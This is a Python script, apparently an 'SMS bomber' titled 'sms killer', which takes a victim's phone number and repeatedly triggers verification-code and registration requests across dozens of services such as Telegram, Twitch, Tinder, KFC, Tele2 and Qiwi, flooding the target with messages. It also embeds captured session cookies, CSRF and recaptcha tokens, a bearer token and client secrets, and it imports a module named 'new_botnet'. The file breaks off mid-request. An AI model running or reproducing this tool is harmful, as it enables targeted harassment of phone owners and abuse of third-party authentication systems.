
from os import system,name
import time
try:
    import colorama
except:
    system('pip3 install colorama')
from new_botnet import spam_gmail
from colorama import init, Fore, Back, Style
print(Fore.LIGHTGREEN_EX+'Проверка зависимостей.')
try:
    import requests
except:
    system('pip3 install requests')
import random
try:
    from fake_headers import Headers
except:
    system('pip3 install fake_headers')
from numq import num
system('clear')
from time import sleep
init( autoreset=True)
__author__ = 'ilyargat'
#-------------------------------------------
logo='''
                           __   _ ____             
   _________ ___  _____   / /__(_) / /__  _____    
  / ___/ __ `__ \/ ___/  / //_/ / / / _ \/ ___/    
 (__  ) / / / / (__  )  / ,< / / / /  __/ /        
/____/_/ /_/ /_/____/  /_/|_/_/_/_/\___/_/         
     ,--.!,
  __/   -*-
,d08b.  '|`
0088MM
`9MMP'   hjm
'''
#-------------------------------------------


def spam(phone):
    password = 123102
    username = 123123
    numm=0
    phone9 = phone[1:]
    plus_phone = '+'+phone
    v_phone='8'+phone9
    #--------------------------------------------------------
    HEADERS = Headers(os="mac", headers=True).generate()

    numm=numm+1
    #------------------------------------------------------

    def start(phone):
        try:
            requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",
                          data={
                              "msisdn": phone,
                              "locale": "en",
                              "countryCode": "ru",
                              "version": "1",
                              "k": "ic1rtwz1s1Hj1O0r",
                              "r": "46763",
                          },
                          headers=HEADERS)
        except:
            pass
        try:
            requests.get("https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B" + phone)
        except:
            pass
        try:
            requests.post("https://www.aptekaonline.ru/login/ajax_sms_order.php", data={"PERSONAL_MOBILE": "+" + phone},
                          headers=HEADERS)
        except:
            pass
        global phone9
        try:
            requests.post('https://site-api.mcdonalds.ru/api/v1/user/login/phone', headers=HEADERS)
            requests.post('https://site-api.mcdonalds.ru/api/v1/user/login/phone', json={"number":phone,"g-recaptcha-response":"03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V"}, headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",
        data={
            "msisdn": phone,
            "locale": "en",
            "countryCode": "ru",
            "version": "1",
            "k": "ic1rtwz1s1Hj1O0r",
            "r": "46763",
        },
        headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://www.aptekaonline.ru/login/ajax_sms_order.php",data={"PERSONAL_MOBILE": "+" +phone})
        except:
            pass
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',data={"phone": phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/'+plus_phone+'/',headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"},headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://www.citilink.ru/registration/confirm/phone/"+phone+"/",headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"},headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://b.utair.ru/api/v1/login/', data = {'login':v_phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://my.telegram.org/auth/send_password',data={'phone':phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": 'dqwuh123mkewq1', "phone_number": phone,"username": 'ilyargat'},headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://my.telegram.org/auth/send_password',data={'phone':phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"},headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": plus_phone, "api": 2, "email": "email","x-email": "x-email"},headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': plus_phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": plus_phone},headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":plus_phone}, headers=HEADERS)
        except:
            pass
        try:
            requests.post('https://youdrive.today/login/web/phone', data={'phone': phone9, 'phone_code': '7'},headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=HEADERS)
        except:
            pass
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
        except:
            pass
        try:
            requests.post(
                "https://mobile-api.qiwi.com/oauth/authorize",
                data={"response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                      "username": phone,
                      "client_id": "android-qw",
                      "client_secret": "zAm4FKq9UnSe7id", },  headers=HEADERS)

        except:
            pass
        try:
            response = requests.post(
                'https://apteka.magnit.ru/api/personal/auth/code/',
                data={'phone': phone},
                timeout=6
            )
        except:
            pass
        try:
            response = requests.post(
                "https://passport.twitch.tv/register?trusted_request=true",
                json={
                    "birthday": {"day": 19, "month": 3, "year": 1988},
                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                    "include_verification_code": True,
                    "password": password,
                    "phone_number": "+" + phone,
                    "username": username,
                },
                timeout=6)
        except:
            pass
        cookies = {
            'isAddressPopupShown_': 'true',
            'region_id': '9',
            'rrpvid': '874423120805119',
            '_GASHOP': '729_Simferopol',
            'methodDelivery_': '1',
            '_gcl_au': '1.1.1319080429.1616278874',
            'rcuid': '5fe8a97d08718b000115e393',
            '_ym_uid': '16162788781041835772',
            '_ym_d': '1616278878',
            '_gid': 'GA1.2.438049857.1616278878',
            'mindboxDeviceUUID': 'fc9b81f4-1e69-4e96-bd85-bb32c0aea013',
            'directCrm-session': '%7B%22deviceGuid%22%3A%22fc9b81f4-1e69-4e96-bd85-bb32c0aea013%22%7D',
            '_fbp': 'fb.1.1616278880408.715959506',
            '_clck': '1ox9yio',
            'device_id': '535430852443.588',
            '_ym_isad': '1',
            'acceptCookies_': 'true',
            'SERVERID': 'web-4',
            'merchant_ID_': '729',
            '_ga_6KC2J1XGF1': 'GS1.1.1616326545.2.0.1616326545.60',
            '_ga': 'GA1.2.115099898.1616278878',
            '_dc_gtm_UA-49770337-2': '1',
            '_dc_gtm_UA-112545724-4': '1',
            '_gat_UA-112545724-4': '1',
            '_gat_UA-49770337-2': '1',
        }

        headers = {
            'authority': 'www.auchan.ru',
            'x-newrelic-id': 'VgACUV5XDBADUlhXAQAHUw==',
            'tracestate': '2650844@nr=0-1-2650844-36956222-b9f00d0ffe907acc----1616326576568',
            'traceparent': '00-d523eb78f6adc4fa0ed2d93c33b12820-b9f00d0ffe907acc-01',
            'source': '4',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI2NTA4NDQiLCJhcCI6IjM2OTU2MjIyIiwiaWQiOiJiOWYwMGQwZmZlOTA3YWNjIiwidHIiOiJkNTIzZWI3OGY2YWRjNGZhMGVkMmQ5M2MzM2IxMjgyMCIsInRpIjoxNjE2MzI2NTc2NTY4fX0=',
            'accept': 'application/json, text/plain, */*',
            'access_token': 'eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2OTZjMWI5Zi0xZzQ1LTQ1OWEtYmVhNC0xMTEwNjhmYWNkYTgiLCJpYXQiOjE2MTYzMjY2MjYsInN1YiI6ImNoZWNrbWFpbF91c2VyIiwibGV2ZWwiOjIwLCJpc3MiOiJBdWNoYW4ucnUiLCJleHAiOjE2MjAzMjY2MjZ9.2SsO2PYBrVvSrpCz3izMBmLmFH3RB1YJLfGasgQuHdg',
            'phone': phone,
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.auchan.ru/auth/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        try:
            response = requests.get(
                'https://www.auchan.ru/v1/cmd/clientprofile/checkphone',
                headers=headers,
                cookies=cookies,
                timeout=6
            )
        except:
            pass

        headers = {
            'authority': 'www.kristall-shop.ru',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.kristall-shop.ru',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.kristall-shop.ru/personal/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': 'PHPSESSID=r4desh3fbhevg7m4vk2vf03na6; user_source=organic; user_id=46370e0a1b68d0bf4e1b7bb8132586c5; user_type=client; city=1; _ga=GA1.2.410195338.1616064609; _gid=GA1.2.1787331861.1616064609; _ym_uid=16160646121072446126; _ym_d=1616064612; _ym_visorc=w; _ym_isad=1; carrotquest_device_guid=36cb803c-bbe4-4b48-8521-d4d2861e48d4; carrotquest_uid=872051452346894408; carrotquest_auth_token=user.872051452346894408.30502-9dd4b1269cd5bcf498c034aaca.051ea86add4ca6f72946960e47db2ee520c6bb22c093bb47; carrotquest_realtime_services_transport=wss; _gat=1; _fbp=fb.1.1616064614999.196552439; _lhtm_u=605326f86b5eb17702d59945; _lhtm_r=https%3A//www.google.com/|240b43d374aac45ad0dae432; special_widget=on; pw_deviceid=00bf4aa8-09ef-4ce3-9330-fc09e2daa874; pw_status_ebb5e037c961ce0ebf4188bb99f304e89a224c184d76d400c4ec605fe7a4f999=deny; carrotquest_session=qinszpxcgcwpzuvtnztre0z75pdqekzq; carrotquest_session_started=1; lh_widget_system_pages_counter=1',
        }

        params = (
            ('x', 'personal'),
        )

        data = {
            'action': 'sms_send',
            'phone': phone
        }
        try:
            response = requests.post(
                'https://www.kristall-shop.ru/ajaxer.php',
                headers=headers,
                params=params,
                data=data,
                timeout=6
            )
        except:
            pass
        headers = {
            'authority': 'n13519.yclients.com',
            'accept': 'application/json, text/plain, */*',
            'x-requested-with': 'XMLHttpRequest',
            'accept-language': 'ru-RU',
            'authorization': 'Bearer yusw3yeu6hrr4r9j3gw6',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/json',
            'origin': 'https://n13519.yclients.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://n13519.yclients.com/company:32366/fullscreen-menu-login/code',
            'cookie': '_ym_uid=1616326835560271226; _ym_d=1616326835; _ym_visorc=w; _ym_isad=1',
        }

        data = '{"phone":"uryn"}'.replace('uryn', str(phone))
        try:
            response = requests.post(
                'https://n13519.yclients.com/api/v1/book_code/32366',
                headers=headers,
                data=data,
                timeout=6
            )
        except:
            pass
        headers = {
            'authority': 'goldapple.ru',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'recaptcha-token': '03AGdBq25UgAOHV6fXg1sh4WmVeNJqis6UQaznJSl56yy6fW-_dJnT7v_KQgLUEyaWyVaSIL-u4A0xoceLdjo2HAHqfV8EQH16Q_vhOEaMSsEvXzxng2G-epj9WzxBxc8QRoA9z1jfOJDg2vR57i5p4VKLTe3MeYpntjVQOhMTZLqlDQRdz6p6EAQmSF8OqeCrKXpqvCLJTZ43UNTvx2OWVmAmsWe2G5ahm8HrkDi0MLxJkwDVB6kCecWFYNFatY3yVZ8hyH9iuQAAy6y6ArohHOMitxoJ1cUSTu4U7UelXkbnN_EC9C2ODY8A-vH2hAw-sErL7BhQknwHLbZSXZT4DmOJma03UQFpmdWH3absLOp_b7ZCg-4_8CPNigBfnSxp2w3JvxjOoJzvjeIynp5xe4zXhHEu-pvlnw',
            'content-type': 'application/json',
            'origin': 'https://goldapple.ru',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://goldapple.ru/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': 'ipp_uid2=UKfgIumQqkJBYD73/+e69CptWHhDflGT/5Sv+oQ==; ipp_uid1=1616063138743; ipp_uid=1616063138743/UKfgIumQqkJBYD73/+e69CptWHhDflGT/5Sv+oQ==; rerf=AAAAAGBTKqI271HTA2QPAg==; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; flocktory-uuid=269e7a70-c08e-484d-8ae5-ac4c2960c443-0; form_key=GEF9MzPH6i1RCYUz; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; client-store-code=default; mage-cache-sessid=true; PHPSESSID=fnsp54igtu0iu99trmr4fsrj9o; store=default; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _userGUID=0:kmeq9dwv:aO7kVWva~kLxvbl05F5ev9OcMS_D626a; dSesn=da4b7085-8ecd-4f06-f40a-f8a242c63515; _dvs=0:kmeq9dwv:0IXdQtogVTVWhP86rd7UKEE4fuBbkEKa; section_data_ids=%7B%22geolocation%22%3A1616063147%2C%22cart%22%3A1616063147%2C%22adult_goods%22%3A1616063148%7D; _gid=GA1.2.135442248.1616063132; _gat_UA-31209334-1=1; _ym_uid=1616063132662367567; _ym_d=1616063132; _ga_QE5MQ8XJJK=GS1.1.1616063130.1.0.1616063130.0; _ga=GA1.2.1309556652.1616063132; _ym_isad=1; _fbp=fb.1.1616063133105.117113483; rr_rcs=eF4FwTESgCAMBMCGyr_cTC4hAX7gNwxSWNip73e3lHfu3mdreQxkzoV6DEWldGj6Ii26-tzu77lOYRsGBkPC6EYV0AD-n0UReQ; mindboxDeviceUUID=fc9b81f4-1e69-4e96-bd85-bb32c0aea013; directCrm-session=%7B%22deviceGuid%22%3A%22fc9b81f4-1e69-4e96-bd85-bb32c0aea013%22%7D',
        }

        data = '{"country_code":"RU","phone":"uryn"}'.replace('uryn', str(phone))
        try:
            response = requests.post(
                'https://goldapple.ru/rest/V1/customer/registration/start',
                headers=headers,
                data=data,
                timeout=6
            )
        except:
            pass
        headers = {
            'Connection': 'keep-alive',
            'X-HASH': 'c625e41dcf708c70aec75d9219846249',
            'Accept': 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryVn8pvqIINnHzFQS4',
            'Origin': 'https://savetime.net',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://savetime.net/?sidebar_open=login',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = '$------WebKitFormBoundaryVn8pvqIINnHzFQS4\\r\\nContent-Disposition: form-data; name="accept"\\r\\n\\r\\n1\\r\\n------WebKitFormBoundaryVn8pvqIINnHzFQS4--\\r\\n'

        response = requests.post(
            f'https://api.savetime.net/v2/client/login/{phone}',
            headers=headers,
            data=data,
            timeout=6
        )

        headers = {
            'authority': 'sushiwok.ru',
            'accept': 'application/json, text/plain, */*',
            'x-csrf-token': 'tz70vMoL-0VQInx5uaTRC14legs_CX8DC9os',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://sushiwok.ru',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://sushiwok.ru/spb/profile/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': '_csrf=lH4Ryi1VBKZsZ2r7UkeCEfrK; connect.sid=s%3AGr79X3B4iQFod3Sein1U-GlPnQvTllce.LisIeAqUdn0NtG8UMpxKWyFxWOcXMka9wD%2BMzYLBSb0; _gid=GA1.2.2060884779.1615215100; _ym_uid=1615215101536389399; _ym_d=1615215101; lgvid=604639f846e0fb0001e64fc3; lgkey=3fceed4268e01da86922939315def11c; _ym_visorc=w; _ym_isad=1; _fbp=fb.1.1615215103948.1720604809; _gat_gtag_UA_88670217_1=1; _gat_ITRZ=1; _gat_SPB=1; _gat_GA=1; _ga=GA1.1.895858968.1615215100; _ga_TE53H5X77H=GS1.1.1615215102.1.1.1615215127.0',
        }

        data = '{"phone":"aaaa","numbers":4}'.replace('aaaa', str(phone))

        response = requests.post(
            'https://sushiwok.ru/user/phone/validate',
            headers=headers,
            data=data,
            timeout=6
        )

        cookies = {
            'guid_city': 'e718a680-4b33-11e4-ab6d-005056801329',
            'name_city': '%D0%9A%D0%B8%D0%B5%D0%B2',
            'guid_region': 'e718a680-4b33-11e4-ab6d-005056801329',
            'guid_country': '7f6f8f46-ce4c-4837-99fb-3b9738e884b2',
            'PHPSESSID': '4vvq0faej9oi0dab50pjo3jl7h',
            'fuser_id': '4d059bdfb215160cd9be92d904825950f1001db0a2c592155d0271bb5284517aa%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22fuser_id%22%3Bi%3A1%3Bs%3A32%3A%22e53abc50c9e40b6c4cc7df23af585682%22%3B%7D',
            '_csrf': '90324ba59d00884e83aac4c8fbbe3042dc519490d718e5f8dd7b45c60f679b90a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22WWd_tQaHdBYhNvJazSEjhelH_zlH4veZ%22%3B%7D',
            'dSesn': '2e24c0b1-33c0-9cde-8e72-da1185a3bccc',
            '_userGUID': '0:kmeppanq:Jz1_sW0ljeTuK6CHbLXD4AK0auqYBy2e',
            '_gid': 'GA1.2.1959839117.1616062191',
            '_ym_uid': '1616062191579299432',
            '_ym_d': '1616062191',
            '_dvs': '0:kmeppanq:e9mPBX2livTM~5JoT9~BVD9KXwZCyeYd',
            '_ym_visorc': 'w',
            'mindboxDeviceUUID': 'fc9b81f4-1e69-4e96-bd85-bb32c0aea013',
            'directCrm-session': '%7B%22deviceGuid%22%3A%22fc9b81f4-1e69-4e96-bd85-bb32c0aea013%22%7D',
            '_fbp': 'fb.1.1616062193298.1824922698',
            '_ym_isad': '1',
            'flocktory-uuid': '809c8a43-d5d2-46ef-899b-68fa5c166feb-2',
            '_ga': 'GA1.2.623425270.1616062191',
            '_gat_UA-50519746-1': '1',
            '_ga_4W8KQSGYRV': 'GS1.1.1616062189.1.0.1616062196.0',
            'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', }

        headers = {
            'Connection': 'keep-alive',
            'X-Source': 'site',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Origin': 'https://sokolov.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://sokolov.ru/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = '{"phone":"ammw","_csrf":"amtgKZ4Re8yEwopd7c7qxG_k1FYFgXU0qn1lV12kZAU9PAR26kAahOCA0zWjuKClFbeRPG3kGXz1BwkfadIBXw=="}'.replace(
            'ammw', str(phone))

        response = requests.post(
            'https://sokolov.ru/auth/send-sms-code/',
            headers=headers,
            cookies=cookies,
            data=data,
            timeout=6
        )

        cookies = {
            'PHPSESSID': '5hohg71g0cbkmonq7s325si327',
            'user_refresh_token': '6da081a6e4874ef262f0440727bb3f1e2a5dfd4fef45bc9c5f24bd2c10920edca%3A2%3A%7Bi%3A0%3Bs%3A18%3A%22user_refresh_token%22%3Bi%3A1%3Bs%3A36%3A%22f6935de0-87d0-11eb-b6b6-eb8fe3c90d9b%22%3B%7D',
            'selected_domain': 'de30a27b921ab12960da602db09a42aaa09c0dfeda56d4ba4b7ed740294217c9a%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22selected_domain%22%3Bi%3A1%3Bs%3A6%3A%22moscow%22%3B%7D',
            '_csrf': 'c2fc8e4548aae1bfb4f746d7f8a553c72d1e519345d0d9275bd43ab8c311f09aa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22zVJ9VbhKsyfBXuPZ51PV5-OS18pr3Avi%22%3B%7D',
            '_ga': 'GA1.2.1428943935.1616061700',
            '_gid': 'GA1.2.1542062782.1616061700',
            '_ym_uid': '16160617001022414348',
            '_ym_d': '1616061700',
            '_ym_isad': '1',
            '_ym_visorc': 'w',
            '_fbp': 'fb.1.1616061700692.993187158',
        }

        headers = {
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'X-CSRF-Token': '6YQQtz3qq_9_S1QX2-4Zs9KZ9u5QMQUQg2Wdi-ech-CT0lqOa4jDtAwyMlWDm0np56imuGUcSkOyXe351N3xiQ==',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://broniboy.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://broniboy.ru/moscow/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = {
            'phone': phone,
            '_csrf': '6YQQtz3qq_9_S1QX2-4Zs9KZ9u5QMQUQg2Wdi-ech-CT0lqOa4jDtAwyMlWDm0np56imuGUcSkOyXe351N3xiQ=='
        }

        response = requests.post(
            'https://broniboy.ru/ajax/send-sms',
            headers=headers,
            cookies=cookies,
            data=data,
            timeout=6
        )

        headers = {
            'Connection': 'keep-alive',
            'PlatformName': 'WEB',
            'ApplicationVersion': '20.23.0',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Accept': 'application/json',
            'Access-Control-Allow-Credentials': 'true',
            'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept',
            'Origin': 'https://maxi-retail.ru',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://maxi-retail.ru/auth',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        phone = str(phone)
        data = '{"phone":"uryn"}'.replace('uryn', str(phone[1:]))

        response = requests.post(
            'https://maxi.today/api/v3/registration/phone',
            headers=headers,
            data=data,
            timeout=6,
        )
        phone = int(phone)
        cookies = {
            '_ym_uid': '1605105660244322467',
            '_ym_d': '1605105660',
            '.ASPXANONYMOUS': 'jvxYwEsMfk6BXQlriYYL-A',
            '_SL_': '6.1509745.1509752.',
            '_ipl': '6.1509745.1509752.',
            'AB_CREDIT': 'Test_00035_A',
            'AB_CREDIT_DIRECT': 'never',
            '__utmz': 'utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3dorganic%7cutmcsr%3dyandex%7cutmctr%3d(not%20set)',
            '__utmx': 'utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3dorganic%7cutmcsr%3dyandex%7cutmctr%3d(not%20set)',
            '_gcl_au': '1.1.1184645255.1615059953',
            '_gid': 'GA1.2.2020936344.1615059954',
            '_ga': 'GA1.1.438067474.1615059954',
            '_ym_isad': '1',
            '_ym_visorc': 'b',
            '_fbp': 'fb.1.1615059955644.1650744830',
            '_ga_TEQH0NKK0Q': 'GS1.1.1615059953.1.0.1615059960.53',
            '.AspNetCore.Antiforgery.vnVzMy2Mv7Q': 'CfDJ8Mo79Uhrc61BkNG7HBanVqey_muvSzqi8_qIWrDo7MvoMz1r6iPZhAwaENKUFBCsiIHPPym3PgRb6xnirgX748K_CmjcUdOCglvTvyYhl6X8hX4N3BFiH_-8LFKVUPq5VsP0Cu_jIIaR6ZNHpJCBvEQ',
            'reuserid': '7f78bafd-738d-4923-8eb8-4541519c3745',
        }

        headers = {
            'Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'Origin': 'https://my.sravni.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://my.sravni.ru/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.Memory.Service%2520reviews%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.VZR.Service%2520messagesender.sms%2520Sravni.Affiliates.Service%2520esia%2520orders.r%26response_type%3Dcode%2520id_token%2520token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fcallback%252F%26response_mode%3Dform_post%26state%3DRmridyVgj733j_o_VUUUdgSTeMe1W3FdxzSMsz4IWP0%26nonce%3DzrwOa2xfDJLNRbfKi36P2VDjfAmlLZ-EnKg4u4Whwxs%26login_hint%26acr_values&isinnerframe=true',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = {
            '__RequestVerificationToken': 'CfDJ8Mo79Uhrc61BkNG7HBanVqfddj1HvO3ZSASCL80JzDrO0POC-Mgp1O-nte3Fk2FzD_MSBw6-P9d4Q8229e4gXa7YRY1nYzTh7U82Qs3QLA-dttR2kfxtMxoWZYlvX34LeXH8U9JDHgyxQcOkGoCs2Nk',
            'phone': f'+{phone}',
